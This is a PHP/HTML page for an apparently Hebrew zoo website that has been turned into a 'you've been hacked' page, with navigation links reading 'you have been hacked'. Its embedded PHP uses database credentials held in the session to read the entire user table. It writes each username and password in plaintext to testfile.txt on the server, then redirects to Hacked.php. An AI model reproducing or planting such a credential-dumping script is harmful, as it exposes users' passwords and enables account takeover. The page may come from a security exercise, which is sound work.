<html>
  <head>
    <script type="text/javascript" src="../test/js_file.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="main.css" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

     <?php
      //session_start();
      $con =mysqli_connect($_SESSION['dbPath'],$_SESSION['dbUser'],$_SESSION['dbPass']);
      $table = $_SESSION['usersTable'];
      //echo $con;
      //echo $table;
      mysqli_select_db($con,$table);
      $s= "select * from usertable where 1=1";
      //echo $s;
      $result = mysqli_query($con ,$s);
      $num= mysqli_num_rows($result);

      $myfile = fopen("testfile.txt", "w");

      if($result->num_rows >0)
      {
        while($row = $result->fetch_assoc())
        {
          $username = $row["name"];
          $pass = $row["password"];
          $txt = "Username: $username Password: $pass\n";
          fwrite($myfile, $txt);
          
          header('location:Hacked.php');
                //echo "</section>";
        }
                //echo "<br>";
      }
      fclose($myfile);
      ?>
    	   
  </head>
  <body dir="rtl" style="background-color:#F5F5F5;">
    <header id="header_test">
      <div class="img-responsive">
        <div class="a" style="margin-bottom:0">
          <img src="includes/zoo-new.png" class = "zoo-img" >
        </div>
      </div>
      <nav class="navbar navbar-expand-sm bg-dark navbar-dark">
        <a class="navbar-brand" href="#">דף הבית</a>
        <button class="navbar-toggler" type="button"  onclick="openNav()" id= "navbar-toggler" data-toggle="collapse" data-target="#collapsibleNavbar">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="collapsibleNavbar">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="#">נפרצת</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#">נפרצת</a>
            <li class="nav-item">
              <a class="nav-link" href="#">נפרצת</a>
            </li>
            <!-- <li class="nav-item">
              <?php/* 
                  if(isset($name))
                  {
                    echo "<a class='nav-link' href='userRegistration/editUser.php?id=$name'>
                      Welcome $name
                    </a> ";
                  }
              */?>
            </li> -->
          </ul>
        </div>  
      </nav>
    </header>
</html>